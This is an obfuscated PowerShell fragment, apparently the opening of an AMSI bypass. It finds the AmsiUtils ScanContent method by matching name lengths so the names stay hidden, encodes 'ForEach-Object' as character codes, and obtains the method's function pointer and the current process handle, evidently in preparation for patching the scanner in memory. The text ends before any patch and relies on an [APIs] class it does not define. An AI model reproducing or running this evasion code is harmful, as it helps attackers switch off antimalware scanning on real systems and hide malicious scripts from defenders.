$DMHHFnsP4um8phMlaAc5X = [appdomain]::currentdomain.getassemblies()
$DMHHFnsP4um8phMlaAc5X |
  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
    if($_.Location -ne $null){
   	 $wr6l = $_.FullName.Split(",")[0]
   	 If($wr6l.StartsWith('S') -And $wr6l.EndsWith('n') -And $wr6l.Length -eq 28) {
   		 $q = $_.GetTypes()
   	 }
    }
}

$q |
  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
   		 $SoO = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
   	 }
    }
}

$SoO |
  & ([string]::join('', ( (70,111,114,69,97,99,104,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
  		 $yqq = $_
   	 }
    }
}

[IntPtr] $Sfb43I8NSmB1kpgTgZ = $yqq.MethodHandle.GetFunctionPointer()
[IntPtr] $JJN3weuD0Qwomu6RN5MaEqBE = [APIs]::GetCurrentProcess()
$2u4sGyIw = 0
$j = $false

